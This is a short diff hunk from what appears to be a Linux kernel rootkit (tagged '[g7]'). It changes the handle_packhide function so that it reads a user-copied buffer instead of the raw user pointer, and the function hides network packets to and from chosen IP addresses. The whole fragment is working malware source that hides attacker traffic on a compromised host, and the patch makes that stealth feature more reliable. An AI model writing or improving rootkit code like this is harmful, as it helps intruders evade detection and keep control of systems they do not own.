@@ -251,18 +251,18 @@ handle_packhide(unsigned long arg)
     } else if (!copy_from_user(buf, sarg, BUFLEN)
         && (strstr(buf, ":") || strstr(buf, ".")))
     {
-        if (sarg[0] == (char)1) {
+        if (buf[0] == (char)1) {
             if (!rootkit.hiding_packets) {
                 hide_packets();
                 DEBUG_NOTICE("[g7] packet hiding on\n");
             }
 
-            hide_ip(&sarg[1]);
+            hide_ip(&buf[1]);
             rootkit.hiding_packets = 1;
-            DEBUG_INFO("[g7] hiding packets from/to ip address %s\n", &sarg[1]);
-        } else if (sarg[0] == (char)-1) {
-            unhide_ip(&sarg[1]);
-            DEBUG_INFO("[g7] unhiding packets from/to ip address %s\n", &sarg[1]);
+            DEBUG_INFO("[g7] hiding packets from/to ip address %s\n", &buf[1]);
+        } else if (buf[0] == (char)-1) {
+            unhide_ip(&buf[1]);
+            DEBUG_INFO("[g7] unhiding packets from/to ip address %s\n", &buf[1]);
         } else
             return -ENOTTY;
 
